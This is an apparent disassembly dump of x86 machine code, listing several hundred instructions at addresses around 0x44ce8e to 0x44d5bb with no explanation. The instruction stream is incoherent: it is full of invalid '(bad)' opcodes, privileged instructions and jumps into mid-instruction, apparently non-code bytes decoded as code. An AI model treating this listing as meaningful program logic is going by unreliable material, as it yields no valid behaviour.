  44ce8e:	lods   eax,DWORD PTR ds:[esi]
  44ce8f:	jbe    0x44cec2
  44ce91:	xchg   ecx,eax
  44ce92:	fsub   QWORD PTR [ecx+0x15ee2797]
  44ce98:	neg    ebx
  44ce9a:	loopne 0x44cf04
  44ce9c:	pop    edi
  44ce9d:	sub    esi,edx
  44ce9f:	loop   0x44ce29
  44cea1:	mov    cl,0xa0
  44cea3:	inc    esi
  44cea4:	mov    DWORD PTR [esi],edx
  44cea6:	inc    ecx
  44cea7:	out    0xa5,al
  44cea9:	add    eax,0xbbbb8044
  44ceae:	jno    0x44cf01
  44ceb0:	iret   
  44ceb1:	jle    0x44ced2
  44ceb3:	int    0x50
  44ceb5:	push   cs
  44ceb6:	or     DWORD PTR [ebx-0x464d0c2c],edi
  44cebc:	lods   al,BYTE PTR ss:[esi]
  44cebe:	push   edi
  44cebf:	pusha  
  44cec0:	dec    edi
  44cec1:	mov    cr6,ecx
  44cec4:	sbb    ebp,esi
  44cec6:	sub    al,0xcf
  44cec8:	mov    DWORD PTR [ebx+0x53],ebp
  44cecb:	cdq    
  44cecc:	mov    eax,ds:0x96cb23cd
  44ced1:	add    dl,BYTE PTR [edx]
  44ced3:	mov    edx,0x9dda3f94
  44ced8:	arpl   sp,sp
  44ceda:	and    edi,DWORD PTR [edi-0x2c574e77]
  44cee0:	fisubr WORD PTR [esi-0x43]
  44cee3:	mov    ch,0x91
  44cee5:	add    eax,0xc58147ae
  44ceea:	(bad)  
  44ceeb:	repnz xchg edi,eax
  44ceed:	repz sbb eax,0x886589e4
  44cef3:	and    eax,DWORD PTR [edi+ecx*2-0x1965f085]
  44cefa:	in     al,dx
  44cefb:	leave  
  44cefc:	rol    BYTE PTR [ebx],1
  44cefe:	rcr    BYTE PTR [edx],1
  44cf00:	icebp  
  44cf01:	xor    al,0x77
  44cf03:	mov    ah,0xca
  44cf05:	in     eax,0x75
  44cf07:	mov    cs,WORD PTR [ecx+0x6103dfb1]
  44cf0d:	iret   
  44cf0e:	sbb    ch,BYTE PTR [edx]
  44cf10:	leave  
  44cf11:	add    eax,0x227a1ca0
  44cf16:	pusha  
  44cf17:	xchg   ecx,eax
  44cf18:	xor    DWORD PTR [ecx],edi
  44cf1a:	push   ds
  44cf1b:	out    dx,eax
  44cf1c:	rcl    BYTE PTR [ecx+0x13],0x21
  44cf20:	mov    eax,0x4d73c16
  44cf25:	je     0x44cef7
  44cf27:	xchg   al,ah
  44cf29:	rcr    ebp,0x6f
  44cf2c:	mov    BYTE PTR [ebx-0x2e],cl
  44cf2f:	ss loop 0x44cf11
  44cf32:	dec    edi
  44cf33:	(bad)  
  44cf34:	mov    al,0x5
  44cf36:	push   esp
  44cf37:	loop   0x44cf57
  44cf39:	mov    ah,0x19
  44cf3b:	mov    ebx,0xd95db8c9
  44cf40:	sub    al,0x9e
  44cf42:	pusha  
  44cf43:	push   ebx
  44cf44:	stos   BYTE PTR es:[edi],al
  44cf45:	pop    esi
  44cf46:	lods   al,BYTE PTR ds:[esi]
  44cf47:	xor    ah,BYTE PTR cs:[esi+eiz*1]
  44cf4b:	sbb    al,ch
  44cf4d:	(bad)
  44cf50:	mov    esp,ebp
  44cf52:	adc    esi,ebx
  44cf54:	lds    ebp,FWORD PTR [ebx-0x4277914c]
  44cf5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44cf5b:	xchg   ebp,eax
  44cf5c:	data16 jp 0x44cf98
  44cf5f:	aam    0xc2
  44cf61:	stos   BYTE PTR es:[edi],al
  44cf62:	arpl   di,si
  44cf64:	inc    edi
  44cf65:	sub    ebx,eax
  44cf67:	push   ebx
  44cf68:	mov    WORD PTR [ebx],?
  44cf6a:	popf   
  44cf6b:	adc    BYTE PTR [ecx-0x58],dh
  44cf6e:	dec    eax
  44cf6f:	adc    al,0x92
  44cf71:	cs or  bh,dl
  44cf74:	inc    ebp
  44cf75:	jmp    0x44cf01
  44cf77:	sbb    ah,dh
  44cf79:	pop    ss
  44cf7a:	mov    eax,0x497898d
  44cf7f:	sahf   
  44cf80:	push   esp
  44cf81:	xchg   ebp,eax
  44cf82:	imul   ecx,DWORD PTR ds:0x2b0002aa,0xffffffbc
  44cf89:	xchg   ebx,eax
  44cf8a:	mov    cl,0x30
  44cf8c:	push   ebx
  44cf8d:	pop    edi
  44cf8e:	pop    ds
  44cf8f:	ret    
  44cf90:	ja     0x44cfc0
  44cf92:	(bad)
  44cf95:	fisttp QWORD PTR [esp+edx*8]
  44cf98:	mov    cl,0xaa
  44cf9a:	xchg   ebp,eax
  44cf9b:	mov    al,0x55
  44cf9d:	sub    ch,BYTE PTR [edi+esi*1]
  44cfa0:	mov    cl,cl
  44cfa2:	es jge 0x44cf67
  44cfa5:	fstp   QWORD PTR [ecx]
  44cfa7:	aad    0x56
  44cfa9:	push   0x1c
  44cfab:	rcl    dh,cl
  44cfad:	add    dh,BYTE PTR [esi-0x18]
  44cfb0:	and    ecx,esp
  44cfb2:	out    dx,al
  44cfb3:	or     DWORD PTR [esi-0x2b33477],0x31
  44cfba:	shl    BYTE PTR [ebp-0x2abf3cc4],1
  44cfc0:	je     0x44cf9f
  44cfc2:	lods   eax,DWORD PTR ds:[esi]
  44cfc3:	jae    0x44cfb0
  44cfc5:	gs data16 js 0x44cf52
  44cfc9:	xrelease mov DWORD PTR [esi-0x2a0e298b],0xd5cd04c0
  44cfd4:	inc    ebx
  44cfd5:	cs dec edi
  44cfd7:	jle    0x44cfc9
  44cfd9:	das    
  44cfda:	xor    ebx,ebp
  44cfdc:	mov    ebx,DWORD PTR ds:0xdaab7c8b
  44cfe2:	sub    eax,DWORD PTR ds:0xd577d770
  44cfe8:	pop    ebx
  44cfe9:	jne    0x44d05a
  44cfeb:	jle    0x44cffb
  44cfed:	jp     0x44cf9a
  44cfef:	mov    DWORD PTR es:[edi-0x12],ebx
  44cff3:	xchg   DWORD PTR ds:0x8450cc7b,esi
  44cff9:	add    eax,0xedc374a2
  44cffe:	mov    ecx,0x46acae61
  44d003:	mov    ebp,0xd15df0e6
  44d008:	mov    DWORD PTR ds:0x2ba821e6,edx
  44d00e:	push   esi
  44d00f:	aad    0x35
  44d011:	xlat   BYTE PTR ds:[ebx]
  44d012:	add    dh,BYTE PTR [ecx-0x46398bac]
  44d018:	(bad)  
  44d019:	xor    eax,0x6670cbce
  44d01e:	fcom   DWORD PTR ds:0x5d1700f7
  44d024:	add    eax,0xffea1fd2
  44d029:	mov    ebp,0x601fe9b1
  44d02e:	daa    
  44d02f:	inc    ecx
  44d030:	pop    ebx
  44d031:	in     eax,dx
  44d032:	mov    al,0xba
  44d034:	iret   
  44d035:	lock jl 0x44d0ab
  44d038:	inc    esi
  44d039:	add    edx,edx
  44d03b:	pop    ss
  44d03c:	mov    cl,0x3e
  44d03e:	aad    0xd7
  44d040:	dec    eax
  44d041:	subps  xmm2,xmm4
  44d044:	sub    al,0x5b
  44d046:	mov    ds:0x2bbf3b2c,al
  44d04b:	inc    edi
  44d04c:	mov    BYTE PTR [ecx],bh
  44d04e:	lods   al,BYTE PTR ds:[esi]
  44d04f:	cmp    DWORD PTR [ebx-0x31377c31],0x2
  44d056:	call   0x945d4614
  44d05b:	pop    edx
  44d05c:	cdq    
  44d05d:	repz dec eax
  44d05f:	arpl   WORD PTR [eax-0x34],bp
  44d062:	test   BYTE PTR [eax+0x15983ac9],bh
  44d068:	fidivr DWORD PTR ds:0x2544137
  44d06e:	and    bh,al
  44d070:	xor    al,0x12
  44d072:	fcom   QWORD PTR [eax-0x58e097f5]
  44d078:	add    ch,BYTE PTR ds:[ebp-0x35]
  44d07c:	or     al,0xf0
  44d07e:	jbe    0x44d054
  44d080:	push   ebp
  44d081:	fsub   QWORD PTR [esi-0x7a]
  44d084:	int    0xa
  44d086:	rol    BYTE PTR [ebx+0x7b609278],0xee
  44d08d:	lock icebp 
  44d08f:	mov    es,edx
  44d091:	push   ebx
  44d092:	jns    0x44d069
  44d094:	jne    0x44d0e0
  44d096:	mov    dl,0xf5
  44d098:	add    BYTE PTR [ebx-0x2f],al
  44d09b:	in     al,0x6a
  44d09d:	and    al,0x1e
  44d09f:	test   eax,0xdc4625cd
  44d0a4:	mov    ?,WORD PTR [eax]
  44d0a6:	int3   
  44d0a7:	popf   
  44d0a8:	inc    esi
  44d0a9:	mov    esp,ebp
  44d0ab:	aam    0x9a
  44d0ad:	push   ebp
  44d0ae:	sbb    edx,0x35
  44d0b1:	outs   dx,DWORD PTR ds:[esi]
  44d0b2:	inc    esp
  44d0b3:	pop    es
  44d0b4:	movnti DWORD PTR [edi],ebx
  44d0b7:	std    
  44d0b8:	pop    esi
  44d0b9:	iret   
  44d0ba:	pop    ss
  44d0bb:	js     0x44d0eb
  44d0bd:	add    BYTE PTR [eax],ch
  44d0bf:	call   0x839e:0xa1c75f4c
  44d0c6:	call   0x5f3acb8f
  44d0cb:	mov    cl,0xaa
  44d0cd:	in     al,0x5e
  44d0cf:	dec    ecx
  44d0d0:	adc    al,0x89
  44d0d2:	dec    esp
  44d0d3:	push   esp
  44d0d4:	add    esi,edx
  44d0d6:	imul   edx,ebx,0x5504fa97
  44d0dc:	add    ebx,DWORD PTR cs:[edi]
  44d0df:	rol    BYTE PTR [ebp+0x29],cl
  44d0e2:	cmc    
  44d0e3:	or     al,bh
  44d0e5:	pushf  
  44d0e6:	pop    ds
  44d0e7:	cmp    DWORD PTR [ebx-0x5f7ee854],eax
  44d0ed:	adc    DWORD PTR [esi-0x2f],0x14b1f872
  44d0f4:	xchg   ecx,eax
  44d0f5:	(bad)  
  44d0f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d0f8:	pop    ecx
  44d0f9:	out    0xe2,eax
  44d0fb:	data16 (bad) 
  44d0fd:	bound  ebp,QWORD PTR gs:[edx+eiz*1-0x158a16b8]
  44d105:	test   dh,cl
  44d107:	stos   BYTE PTR es:[edi],al
  44d108:	in     eax,0x3f
  44d10a:	aad    0x6d
  44d10c:	stc    
  44d10d:	add    edi,eax
  44d10f:	pop    ebp
  44d110:	and    BYTE PTR [edx+0x7c],0xe1
  44d114:	inc    ecx
  44d115:	adc    DWORD PTR [ebx],ebx
  44d117:	in     eax,0xc5
  44d119:	jno    0x44d124
  44d11b:	jle    0x44d0a6
  44d11d:	mov    eax,ds:0xc274f79f
  44d122:	repz aam 0xff
  44d125:	pop    ds
  44d126:	enter  0xcfd1,0xb6
  44d12a:	arpl   WORD PTR [ecx-0x78],ax
  44d12d:	xlat   BYTE PTR ds:[ebx]
  44d12e:	lds    eax,FWORD PTR [edi+0x71c7e73e]
  44d134:	inc    ebx
  44d135:	add    ah,dl
  44d137:	inc    ebp
  44d138:	xchg   ecx,eax
  44d139:	pusha  
  44d13a:	dec    esp
  44d13b:	lods   al,BYTE PTR ds:[esi]
  44d13c:	lock inc esi
  44d13e:	xlat   BYTE PTR ds:[ebx]
  44d13f:	and    DWORD PTR [ebx-0x7b3c53fe],ebx
  44d145:	shr    DWORD PTR [esi],cl
  44d147:	test   BYTE PTR [eax],ch
  44d149:	or     ch,cl
  44d14b:	aad    0x6c
  44d14d:	sbb    DWORD PTR [eax+0xb],ecx
  44d150:	cmc    
  44d151:	aaa    
  44d152:	stos   DWORD PTR es:[edi],eax
  44d153:	popa   
  44d154:	mov    DWORD PTR [edi+0x56bb543f],ebp
  44d15a:	fcmovnu st,st(5)
  44d15c:	out    0x8d,al
  44d15e:	mov    edi,0xcc8d8787
  44d163:	data16 clc 
  44d165:	test   esi,edi
  44d167:	push   ss
  44d168:	sub    DWORD PTR [edx+0x1f],ebp
  44d16b:	dec    ebp
  44d16c:	rcr    BYTE PTR [ebp-0x77],1
  44d16f:	xchg   ecx,eax
  44d170:	xchg   esi,eax
  44d171:	cmp    ebp,esi
  44d173:	stos   BYTE PTR es:[edi],al
  44d174:	mov    dl,0xa5
  44d176:	lods   al,BYTE PTR ds:[esi]
  44d177:	dec    ecx
  44d178:	data16 cmp BYTE PTR [esi+0x5e],0x62
  44d17d:	pop    edi
  44d17e:	dec    ebx
  44d17f:	fnsetpm(287 only) 
  44d181:	jg     0x44d1a1
  44d183:	retf   
  44d184:	and    DWORD PTR [ebx+edi*2],eax
  44d187:	loopne 0x44d1f7
  44d189:	repnz sub dl,BYTE PTR es:[edi+0x11]
  44d18e:	lahf   
  44d18f:	inc    edi
  44d190:	imul   esi,esp,0xffffffc3
  44d193:	sahf   
  44d194:	mov    BYTE PTR [ecx+0x1b023ca3],bl
  44d19a:	rcr    DWORD PTR [edi-0x3df1fd77],1
  44d1a0:	jno    0x44d137
  44d1a2:	stos   BYTE PTR es:[edi],al
  44d1a3:	push   esi
  44d1a4:	rcr    BYTE PTR [ebp-0x7ca304e1],cl
  44d1aa:	arpl   WORD PTR [ebx-0x50],bp
  44d1ad:	test   al,0x94
  44d1af:	mov    ecx,0x2b23a8b
  44d1b4:	retf   
  44d1b5:	jne    0x44d223
  44d1b7:	(bad)  
  44d1b8:	sar    dl,1
  44d1ba:	sahf   
  44d1bb:	sbb    DWORD PTR [eax+0x20add1cd],ecx
  44d1c1:	push   ss
  44d1c2:	call   0xa39e:0x3a03181e
  44d1c9:	out    dx,al
  44d1ca:	ins    DWORD PTR es:[edi],dx
  44d1cb:	stos   DWORD PTR es:[edi],eax
  44d1cc:	(bad)  
  44d1cd:	pop    edx
  44d1ce:	pop    ds
  44d1cf:	inc    edi
  44d1d0:	das    
  44d1d1:	sub    al,0x6
  44d1d3:	add    DWORD PTR [eax-0x4e],0x7a
  44d1d7:	aad    0xc
  44d1d9:	enter  0x8dea,0xd5
  44d1dd:	dec    esi
  44d1de:	mov    ah,0xa3
  44d1e0:	mov    BYTE PTR [ebx-0x7c],bl
  44d1e3:	(bad)  
  44d1e4:	mov    bh,0x25
  44d1e6:	pop    esi
  44d1e7:	add    BYTE PTR [eax-0x4721c5fb],al
  44d1ed:	fs sub eax,edx
  44d1f0:	cmp    dl,BYTE PTR [ebx]
  44d1f2:	pusha  
  44d1f3:	jecxz  0x44d21f
  44d1f5:	xchg   BYTE PTR [edi-0x603da6d3],bh
  44d1fb:	mov    esp,0x12dc02b1
  44d200:	mov    es,WORD PTR [ecx]
  44d202:	push   cs
  44d203:	repz cmc 
  44d205:	add    BYTE PTR [edi],0x78
  44d208:	call   0xc002:0x46eede6b
  44d20f:	stos   BYTE PTR es:[edi],al
  44d210:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44d211:	mov    ebx,0x5e5cb091
  44d216:	push   ebx
  44d217:	aad    0x2f
  44d219:	clc    
  44d21a:	adc    ecx,ebp
  44d21c:	mov    esi,0x47651e12
  44d221:	test   eax,0x34b094fb
  44d226:	and    ebx,DWORD PTR [edx-0x2a40fe2e]
  44d22c:	popf   
  44d22d:	js     0x44d272
  44d22f:	cmp    al,0x54
  44d231:	fisub  DWORD PTR [ebp-0x15]
  44d234:	loope  0x44d1e3
  44d236:	dec    esp
  44d237:	and    eax,0xd0bf37ef
  44d23c:	fdivrp st(1),st
  44d23e:	das    
  44d23f:	sar    BYTE PTR [esi+eax*8],cl
  44d242:	push   ss
  44d243:	inc    ebx
  44d244:	push   esi
  44d245:	jb     0x44d29f
  44d247:	rcl    DWORD PTR [edx],0xee
  44d24a:	pop    ds
  44d24b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d24c:	mov    ecx,0x486089a0
  44d251:	add    ah,al
  44d253:	mov    WORD PTR [edx+0x38],fs
  44d256:	ror    BYTE PTR ss:0x942160f1,1
  44d25d:	jg     0x44d1fc
  44d25f:	fldcw  WORD PTR [esi-0x144ae91f]
  44d265:	xor    BYTE PTR [edx+0x1155899f],cl
  44d26b:	int3   
  44d26c:	mov    al,ds:0x6523609f
  44d271:	pop    ds
  44d272:	pop    ebx
  44d273:	push   edi
  44d274:	out    0xeb,al
  44d276:	jae    0x44d24d
  44d278:	dec    esp
  44d279:	or     BYTE PTR [ecx+0x598d32ad],cl
  44d27f:	sub    DWORD PTR [ecx+0x31817655],ecx
  44d285:	std    
  44d286:	sub    BYTE PTR [eax],al
  44d288:	jl     0x44d28b
  44d28a:	and    ah,BYTE PTR [esi+0x5d0eeb1b]
  44d290:	cld    
  44d291:	bound  ecx,QWORD PTR [edx+0x757b8952]
  44d297:	into   
  44d298:	out    dx,al
  44d299:	cld    
  44d29a:	dec    edi
  44d29b:	mov    ah,0x9
  44d29d:	add    ch,BYTE PTR [ecx+edx*4]
  44d2a0:	loope  0x44d2b6
  44d2a2:	iret   
  44d2a3:	jecxz  0x44d246
  44d2a5:	mov    ds:0xd3d84160,al
  44d2aa:	cmp    al,BYTE PTR [edx]
  44d2ac:	repz and al,0x18
  44d2af:	inc    eax
  44d2b0:	test   BYTE PTR [edi],cl
  44d2b2:	pop    ds
  44d2b3:	outs   dx,DWORD PTR ds:[esi]
  44d2b4:	aad    0xac
  44d2b6:	xlat   BYTE PTR ds:[ebx]
  44d2b7:	arpl   WORD PTR [ebp+0x3a],ax
  44d2ba:	aaa    
  44d2bb:	fstp   TBYTE PTR [eax-0x31]
  44d2be:	pusha  
  44d2bf:	and    eax,0xc891b149
  44d2c4:	sub    BYTE PTR [ecx+0x6514d4dc],dl
  44d2ca:	(bad)  
  44d2cb:	popa   
  44d2cc:	xchg   esi,eax
  44d2cd:	das    
  44d2ce:	sub    al,0xae
  44d2d0:	mov    DWORD PTR [ebx-0x66],ebp
  44d2d3:	mov    esi,0x7cc1eb0
  44d2d8:	push   edx
  44d2d9:	add    al,al
  44d2db:	pushf  
  44d2dc:	push   cs
  44d2dd:	pop    eax
  44d2de:	mov    bh,0xca
  44d2e0:	jbe    0x44d2ec
  44d2e2:	dec    esi
  44d2e3:	add    esp,DWORD PTR [edi]
  44d2e5:	sbb    esp,DWORD PTR [ebp-0x45]
  44d2e8:	js     0x44d352
  44d2ea:	mov    cl,0x15
  44d2ec:	je     0x44d2be
  44d2ee:	pop    ecx
  44d2ef:	aad    0x9d
  44d2f1:	sub    al,0xc3
  44d2f3:	jno    0x44d308
  44d2f5:	and    BYTE PTR [esi-0x64cf46e2],ah
  44d2fb:	xchg   esi,ebx
  44d2fd:	add    BYTE PTR [ebx],cl
  44d2ff:	test   DWORD PTR [edi],ebx
  44d301:	iret   
  44d302:	fcom   DWORD PTR [esi+0x20]
  44d305:	out    dx,eax
  44d306:	fs aad 0x6f
  44d309:	jmp    0x44d329
  44d30b:	xor    al,0x79
  44d30d:	xor    edx,esi
  44d30f:	shl    BYTE PTR [ebp+0x6c],1
  44d312:	pop    ds
  44d313:	out    dx,eax
  44d314:	fsubr  st(5),st
  44d316:	call   0xf82ee946
  44d31b:	aad    0x47
  44d31d:	jbe    0x44d386
  44d31f:	mov    cl,0xab
  44d321:	dec    edx
  44d322:	xchg   ebx,eax
  44d323:	push   cs
  44d324:	mov    BYTE PTR [ebx+0x7],bl
  44d327:	push   ds
  44d328:	jb     0x44d36b
  44d32a:	fsubr  st(7),st
  44d32c:	or     eax,0x3884d0eb
  44d331:	add    bl,BYTE PTR [edx-0x427fffda]
  44d337:	sbb    BYTE PTR [edi-0x45],dl
  44d33a:	pusha  
  44d33b:	mov    DWORD PTR [ebx+0x46],edx
  44d33e:	dec    esp
  44d33f:	fdivr  QWORD PTR [esi+ebx*4]
  44d342:	stos   BYTE PTR es:[edi],al
  44d343:	in     al,dx
  44d344:	jge    0x44d347
  44d346:	adc    bl,0x8c
  44d349:	nop
  44d34a:	mov    ebx,DWORD PTR [ecx-0x5f]
  44d34d:	std    
  44d34e:	lods   al,BYTE PTR ds:[esi]
  44d34f:	pop    esi
  44d350:	mov    ch,bl
  44d352:	ins    DWORD PTR es:[edi],dx
  44d353:	add    eax,0xf02af69e
  44d358:	mov    al,ds:0x1e3abe02
  44d35d:	int    0x41
  44d35f:	cmp    DWORD PTR [edx-0x78949ac7],edx
  44d365:	jno    0x44d36b
  44d367:	jge    0x44d398
  44d369:	xchg   edx,eax
  44d36a:	pusha  
  44d36b:	push   edx
  44d36c:	jle    0x44d370
  44d36e:	loopne 0x44d3b3
  44d370:	fs mov bl,0xb7
  44d373:	cdq    
  44d374:	in     eax,dx
  44d375:	(bad)  
  44d376:	pusha  
  44d377:	xchg   ecx,eax
  44d378:	mov    dh,0x9d
  44d37a:	sub    edx,edx
  44d37c:	mov    bl,0x86
  44d37e:	xor    esp,ebx
  44d380:	fdivr  st,st(0)
  44d382:	and    edx,esp
  44d384:	cmp    ah,al
  44d386:	test   eax,0xd23cccb7
  44d38b:	mov    esi,0xe1f32989
  44d390:	xchg   esp,eax
  44d391:	add    esp,edi
  44d393:	rol    BYTE PTR [esi-0x22],1
  44d396:	call   0x2dd8:0xb94381d5
  44d39d:	xchg   edi,eax
  44d39e:	dec    ebp
  44d39f:	into   
  44d3a0:	mov    DWORD PTR [ecx-0x41],ebp
  44d3a3:	fbld   TBYTE PTR [eax+0x3e]
  44d3a6:	test   DWORD PTR [esi],0x82380255
  44d3ac:	xchg   BYTE PTR [edx+0x5ac31bf3],al
  44d3b2:	sbb    ebp,DWORD PTR [eax]
  44d3b4:	mov    bl,dl
  44d3b6:	cwde   
  44d3b7:	dec    esi
  44d3b8:	inc    ebp
  44d3b9:	mov    dh,0x6d
  44d3bb:	addr16 jae 0x44d3c0
  44d3be:	mov    ah,0x6a
  44d3c0:	out    0x4c,eax
  44d3c2:	ror    DWORD PTR [eax-0x3b],cl
  44d3c5:	mov    bh,0x1f
  44d3c7:	cdq    
  44d3c8:	mul    DWORD PTR [edx-0x6add7bbd]
  44d3ce:	push   edi
  44d3cf:	stc    
  44d3d0:	loopne 0x44d374
  44d3d2:	test   edx,edi
  44d3d4:	push   0x2
  44d3d6:	rcl    BYTE PTR [eax],1
  44d3d8:	lock les ecx,FWORD PTR [eax-0x27]
  44d3dc:	sbb    eax,0x9fb600b
  44d3e1:	cwde   
  44d3e2:	sbb    al,BYTE PTR ds:0xd6be8468
  44d3e8:	inc    edi
  44d3e9:	cmp    DWORD PTR [ebp+0x260ebe37],edx
  44d3ef:	xchg   edi,eax
  44d3f0:	mov    cl,BYTE PTR [ecx+0x5a]
  44d3f3:	or     eax,DWORD PTR [eax+0x53]
  44d3f6:	lahf   
  44d3f7:	loop   0x44d3be
  44d3f9:	lock push esp
  44d3fb:	bound  ecx,QWORD PTR [ebx]
  44d3fd:	retf   
  44d3fe:	sbb    eax,0x67f894a
  44d403:	mov    BYTE PTR [eax],0xac
  44d406:	xchg   edi,eax
  44d407:	cld    
  44d408:	scas   eax,DWORD PTR es:[edi]
  44d409:	fisttp WORD PTR [edi]
  44d40b:	fwait
  44d40c:	mov    ch,bl
  44d40e:	out    dx,eax
  44d40f:	rcl    edx,1
  44d411:	cmp    ecx,DWORD PTR [edi+0x7e84d7ab]
  44d417:	arpl   WORD PTR [esi],sp
  44d419:	ret    0x707f
  44d41c:	or     eax,0x86271e61
  44d421:	jns    0x44d46c
  44d423:	fnsave [eax]
  44d425:	sub    BYTE PTR [edx-0x5205202b],bl
  44d42b:	sbb    ecx,DWORD PTR [esi-0x79b44eae]
  44d431:	and    DWORD PTR [ebp+ecx*2+0x1880a5a5],esi
  44d438:	mul    BYTE PTR [edx]
  44d43a:	mov    bh,0xd7
  44d43c:	jnp    0x44d3c3
  44d43e:	imul   edi,DWORD PTR [esi+0x25c9dd4a],0x1f647e3f
  44d448:	pop    esi
  44d449:	into   
  44d44a:	wbinvd 
  44d44c:	popa   
  44d44d:	add    ebx,DWORD PTR [esi+0x64]
  44d450:	inc    esi
  44d451:	xchg   esi,eax
  44d452:	push   ebx
  44d453:	inc    ebp
  44d454:	stos   BYTE PTR es:[edi],al
  44d455:	xchg   ebx,eax
  44d456:	pusha  
  44d457:	cdq    
  44d458:	push   ecx
  44d459:	in     al,0xf8
  44d45b:	push   ss
  44d45c:	xchg   edx,eax
  44d45d:	inc    eax
  44d45e:	xor    dl,cl
  44d460:	push   es
  44d461:	(bad)  
  44d463:	mov    al,ds:0x95fb1b4c
  44d468:	shr    ebx,cl
  44d46a:	jnp    0x44d44f
  44d46c:	lods   al,BYTE PTR ds:[esi]
  44d46d:	(bad)  
  44d46e:	cmp    BYTE PTR [ebx+esi*2-0x3e],dl
  44d472:	xchg   edi,eax
  44d473:	and    eax,0xd6fe02ce
  44d478:	outs   dx,BYTE PTR ds:[esi]
  44d479:	repnz das 
  44d47b:	imul   esp,DWORD PTR [edi],0xffffffa8
  44d47e:	pusha  
  44d47f:	sub    DWORD PTR [edi-0x3710eba8],0x3ed40c25
  44d489:	jno    0x44d41d
  44d48b:	pop    edi
  44d48c:	mov    cl,0x6b
  44d48e:	push   es
  44d48f:	fld    QWORD PTR [esi+0x433bddd7]
  44d495:	pop    ecx
  44d496:	mov    eax,ds:0xd77a4cf3
  44d49b:	cmp    al,0xf9
  44d49d:	add    dl,BYTE PTR [esi-0x57]
  44d4a0:	or     BYTE PTR [edi-0x28],dl
  44d4a3:	int3   
  44d4a4:	(bad)  
  44d4a6:	pusha  
  44d4a7:	iret   
  44d4a8:	and    BYTE PTR [ebp+0x799ea77b],cl
  44d4ae:	cmc    
  44d4af:	aam    0x4d
  44d4b1:	sbb    BYTE PTR [ebp+0x428a4cc],ch
  44d4b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44d4b8:	aad    0xa3
  44d4ba:	cmp    al,0xba
  44d4bc:	mov    DWORD PTR [ebp-0x43595423],ebp
  44d4c2:	iret   
  44d4c3:	ror    BYTE PTR [esi+ebp*2+0x3f],cl
  44d4c7:	mov    ds:0x96b083cc,al
  44d4cc:	mov    eax,ds:0x19a71f71
  44d4d1:	adc    DWORD PTR [eax-0x4929fe7e],edi
  44d4d7:	leave  
  44d4d8:	sub    DWORD PTR ds:0x85400a2a,edx
  44d4de:	fidiv  DWORD PTR [edi+0xc3c0c8c]
  44d4e4:	rol    ebp,1
  44d4e6:	pop    ds
  44d4e7:	leave  
  44d4e8:	mov    ss,WORD PTR [edx-0x5efe28d]
  44d4ee:	jecxz  0x44d4c5
  44d4f0:	ins    DWORD PTR es:[edi],dx
  44d4f1:	hlt    
  44d4f2:	mov    eax,ds:0x387d18fd
  44d4f7:	or     al,0x88
  44d4f9:	rcr    DWORD PTR [ebx-0x65ee93be],0x3d
  44d500:	lods   al,BYTE PTR ds:[esi]
  44d501:	add    ah,BYTE PTR [eax-0x18886ac]
  44d507:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44d508:	xchg   esi,eax
  44d509:	popa   
  44d50a:	push   ds
  44d50b:	(bad)  
  44d50c:	mov    ch,0x95
  44d50e:	add    ebp,DWORD PTR [ebp-0x70]
  44d511:	fild   DWORD PTR [esp+edx*8]
  44d514:	adc    BYTE PTR [ebp-0x53],ah
  44d517:	push   ebx
  44d518:	scas   eax,DWORD PTR es:[edi]
  44d519:	sub    esi,DWORD PTR [ecx+0x29]
  44d51c:	mov    BYTE PTR [ebx],ah
  44d51e:	popf   
  44d51f:	lahf   
  44d520:	loopne 0x44d50d
  44d522:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d523:	pop    edi
  44d524:	mov    dl,0x14
  44d526:	push   cs
  44d527:	test   BYTE PTR [ecx],al
  44d529:	cmp    bl,0x15
  44d52c:	ja     0x44d4f9
  44d52e:	add    al,0x62
  44d530:	sub    DWORD PTR [ecx],0x7585b65b
  44d536:	pop    ds
  44d537:	fsubr  st(4),st
  44d539:	(bad)  
  44d53a:	enter  0x82d5,0xf9
  44d53e:	push   ebp
  44d53f:	jo     0x44d51f
  44d541:	call   0xb9ceeded
  44d546:	add    BYTE PTR [ecx+esi*8+0x682f919f],al
  44d54d:	xor    DWORD PTR [esi],esp
  44d54f:	aam    0xca
  44d551:	not    DWORD PTR [ebp-0x5661ca56]
  44d557:	fisttp WORD PTR [ecx-0x7d868a77]
  44d55d:	es cld 
  44d55f:	(bad)  
  44d560:	sub    al,0x0
  44d562:	cs retf 0x3385
  44d566:	sahf   
  44d567:	dec    eax
  44d568:	jg     0x44d525
  44d56a:	inc    edx
  44d56b:	inc    edi
  44d56c:	mov    bh,cl
  44d56e:	sbb    bh,BYTE PTR [ebp-0x29]
  44d571:	test   ebp,ecx
  44d573:	aam    0x6f
  44d575:	add    edx,DWORD PTR [esi]
  44d577:	pop    ebx
  44d578:	xchg   esi,eax
  44d579:	xlat   BYTE PTR ds:[ebx]
  44d57a:	add    esi,DWORD PTR ds:0x6d1fa82d
  44d580:	inc    edx
  44d581:	in     eax,dx
  44d582:	xchg   BYTE PTR [esi+0xa],bh
  44d585:	loopne 0x44d544
  44d587:	aam    0xca
  44d589:	cmp    cl,BYTE PTR [eax+0x1a]
  44d58c:	cmp    dl,BYTE PTR [ebx+0x49b9e7d7]
  44d592:	fmul   DWORD PTR [edi-0x68]
  44d595:	xlat   BYTE PTR ds:[ebx]
  44d596:	and    al,0xd4
  44d598:	mov    ch,0x1a
  44d59a:	pop    esp
  44d59b:	push   eax
  44d59c:	(bad)  
  44d59d:	pop    ebp
  44d59e:	aad    0x8b
  44d5a0:	ins    DWORD PTR es:[edi],dx
  44d5a1:	ins    DWORD PTR es:[edi],dx
  44d5a2:	push   ds
  44d5a3:	dec    ecx
  44d5a4:	clc    
  44d5a5:	cli    
  44d5a6:	jmp    0x44d5ea
  44d5a8:	add    al,0x56
  44d5aa:	inc    ebp
  44d5ab:	inc    esp
  44d5ac:	inc    edx
  44d5ad:	add    al,al
  44d5af:	xor    al,0x64
  44d5b1:	das    
  44d5b2:	fcmovnbe st,st(3)
  44d5b4:	fcomp  DWORD PTR [ecx]
  44d5b6:	push   ds
  44d5b7:	daa    
  44d5b8:	shl    BYTE PTR [ebx],1
  44d5ba:	push   cs
  44d5bb:	icebp  
